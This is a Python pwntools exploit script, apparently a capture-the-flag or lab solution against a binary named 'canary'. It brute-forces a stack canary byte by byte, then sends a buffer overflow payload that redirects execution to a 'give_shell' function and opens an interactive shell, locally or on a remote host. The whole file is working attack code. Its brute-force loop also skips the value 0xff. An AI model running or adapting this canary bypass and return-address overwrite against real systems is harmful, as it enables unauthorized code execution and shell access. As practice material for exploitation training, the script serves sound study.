from pwn import *
import sys
import struct

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


def brute_canary():
    canary = [0x00]
    
    # brute force remaining 3 bytes
    for cb in range(3):
        current_byte = 0x00
        for i in range(255):
            
            
            info(f"Trying {hex(current_byte)} at index {3 - cb}")
            payload = flat({padding: [
                b"".join([struct.pack("B", c) for c in canary]) + struct.pack("B", current_byte)
            ]})
            
            io.sendlineafter(b"read?",str(130 + cb).encode())

            io.sendlineafter(b"data", payload)
            
            io.recvuntil(b"Exiting...")
            io.recvline()
            
            if needle in io.recvline():
                info(f"Found canary at index {3 - cb} : {hex(current_byte)}")
                canary.append(current_byte)
                canary_now = b"".join([struct.pack("B", c) for c in canary])
                print(f"[*] Canary now: {canary_now}")
                break
            else:
                current_byte += 1
    return canary
            
    
# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Binary filename
exe = './canary'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'
context.terminal = 'kitty'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================


# Pass in pattern_size, get back EIP/RIP offset
padding = 128
needle = b"... and exited successfully!"
# Start program
io = start()

canary = brute_canary()
# Build the payload
payload = b"A" * padding
payload += b"".join([struct.pack("B", c) for c in canary])
payload += b"A" * 12
payload += p32(elf.sym["give_shell"])

io.sendlineafter(b"read?",str(len(payload)).encode())

io.sendlineafter(b"data", payload)

# io.recvuntil(b"Exiting...")
# io.recvline()
# print(io.recvline().strip())
# # Send the payload
# io.sendlineafter(b'>', payload)
# io.recvuntil(b'Thank you!')

# Got Shell?
io.interactive()
